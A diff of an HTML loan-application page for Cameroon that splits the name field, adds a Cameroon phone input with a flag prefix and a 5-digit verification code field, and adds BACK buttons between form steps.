@@ -73,13 +73,12 @@
                     <h2 class="highlight-yellow" id="monthlyPayment">XAF 38,267</h2>
                 </div>
 
-                <!-- Clicking this saves values and goes to form -->
                 <button class="btn-primary" onclick="goToForm()">START APPLICATION</button>
             </div>
         </div>
     </div>
 
-    <!-- Screen 3: Loan Details Form (Updated to match screenshot) -->
+    <!-- Screen 3: Application Form -->
     <div id="form-screen" class="dark-screen">
         <div class="calculator-container">
             
@@ -108,7 +107,6 @@
 
                     <div class="input-group">
                         <label>Loan Amount (XAF)</label>
-                        <!-- Readonly means the user cannot change it here, it comes from calculator -->
                         <input type="text" id="formLoanAmount" class="dark-input" readonly>
                     </div>
 
@@ -125,21 +123,40 @@
                     <button class="btn-primary" onclick="nextStep(2)">NEXT STEP</button>
                 </div>
 
-                <!-- Step 2: Personal Details -->
+                <!-- Step 2: Personal Details (UPDATED to match screenshot) -->
                 <div id="step-2" class="form-step">
                     <h2 class="step-title">Personal Details</h2>
                     
                     <div class="input-group">
-                        <label>Full Name</label>
-                        <input type="text" placeholder="John Doe" class="dark-input">
+                        <label>First Name</label>
+                        <input type="text" placeholder="First Name" class="dark-input">
+                    </div>
+
+                    <div class="input-group">
+                        <label>Last Name</label>
+                        <input type="text" placeholder="Last Name" class="dark-input">
                     </div>
                     
                     <div class="input-group">
-                        <label>Phone Number</label>
-                        <input type="tel" placeholder="6XXXXXXXX" class="dark-input">
+                        <label>Phone Number (Cameroon)</label>
+                        <div class="phone-input-wrapper">
+                            <div class="flag-prefix">
+                                <img src="https://flagcdn.com/w40/cm.png" alt="Cameroon Flag">
+                            </div>
+                            <input type="tel" placeholder="9 digits (e.g., 670123456)" class="dark-input phone-input">
+                        </div>
                     </div>
 
-                    <button class="btn-primary" onclick="nextStep(3)">NEXT STEP</button>
+                    <div class="input-group">
+                        <label>5-Digit Verification Code</label>
+                        <input type="text" maxlength="5" placeholder="Enter 5-digit code" class="dark-input">
+                    </div>
+
+                    <!-- Split Buttons -->
+                    <div class="button-row">
+                        <button class="btn-secondary" onclick="prevStep(1)">BACK</button>
+                        <button class="btn-primary" onclick="nextStep(3)">NEXT STEP</button>
+                    </div>
                 </div>
 
                 <!-- Step 3: Employment Details -->
@@ -156,7 +173,10 @@
                         <input type="text" placeholder="e.g. 150000" class="dark-input">
                     </div>
 
-                    <button class="btn-primary" onclick="submitApplication()">SUBMIT APPLICATION</button>
+                    <div class="button-row">
+                        <button class="btn-secondary" onclick="prevStep(2)">BACK</button>
+                        <button class="btn-primary" onclick="submitApplication()">SUBMIT</button>
+                    </div>
                 </div>
             </div>
         </div>
